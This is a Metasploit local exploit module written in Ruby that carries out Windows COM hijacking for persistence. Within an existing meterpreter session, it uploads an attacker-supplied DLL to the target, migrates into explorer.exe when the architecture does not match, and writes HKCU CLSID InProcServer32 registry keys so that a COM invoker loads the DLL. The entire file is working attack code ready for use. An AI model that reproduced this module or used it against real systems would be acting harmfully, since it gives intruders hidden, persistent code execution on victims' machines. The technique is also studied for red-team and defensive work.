require 'msf/core/exploit/exe'
class MetasploitModule < Msf::Exploit::Local
  Rank = ExcellentRanking

#  include Exploit::Powershell
#  include Post::Windows::Priv
  include Post::Windows::Registry
  include Post::Windows::Runas

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'          => 'Windows  COM Hijacking',
        'Description'   => %q{
        The Component Object Model (COM) is a Windows feature for providing interoperability
         between software components through the Operating System itself. In short, COM
         hijacking techniques attempt to abuse this interoperability by redirecting or
         hijacking an invoker application in to calling the attacker payload. COM classes
         can be associated with a handler DLL, which will execute when the invoker application
         attempts to perform interoperability.
        },
        'License'       => MSF_LICENSE,
        'Author'        => [
          'demonsec666', # UAC bypass discovery and research
          'WBGIII', # MSF module
        ],
        'Platform'      => ['win'],
        'SessionTypes'  => ['meterpreter'],
        'Targets'       => [
            [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
            [ 'Windows x64', { 'Arch' => ARCH_X64 } ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions'  =>
  {
    'DisablePayloadHandler' => true
  },
  'References'    => [
    [
      'URL', 'https://www.mdsec.co.uk/2019/05/persistence-the-continued-or-prolonged-existence-of-something-part-2-com-hijacking/',
      'URL', 'https://www.ggsec.cn/comhijack&meterpreter.html'
    ]
  ],
  'DisclosureDate'=> 'Jun 1 2019'
      )
    )

    register_options(
      [
        OptString.new('file_path', [true, 'set  file_path  c:\\\\windows\\\\temp\\\\comhijack.dll'," <windows_path comhijack.dll>"]),
        OptString.new('upload_file', [true, 'set upload_file  <YOU HACK  DLL_PATH>',"<YOU HACK  DLL_PATH>"])
      ])
  end



  def exploit
    upload_file= datastore['upload_file']
    file_name= datastore['file_path']
    print_status("upload #{upload_file} -> #{file_name}")
      if upload_file("#{file_name}","#{upload_file}")
        print_good("success upload #{upload_file} -> #{file_name}")
      end
    info=client.sys.config.sysinfo
    unless info['Architecture']==session.arch
    	session.run_cmd("run migrate -n explorer.exe")
	  end
    registry_path="HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}"
    if registry_createkey(registry_path)
    	print_good("success created HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}")
    end

    if registry_createkey(registry_path+"\\InProcServer32")
    	print_good("success created HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32")
    end

    if registry_setvaldata(registry_path+"\\InProcServer32","","#{file_name}","REG_SZ")
    	print_good("success created HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32 default value #{file_name}")
    end

    if registry_setvaldata(registry_path+"\\InProcServer32","ThreadingModel","Both","REG_SZ")
    	print_good("success created HKCU\\Software\\Classes\\CLSID\\{0358B920-0AC7-461F-98F4-58E32CD89148}\\InProcServer32 ThreadingModel value Both")
    end
  end
end
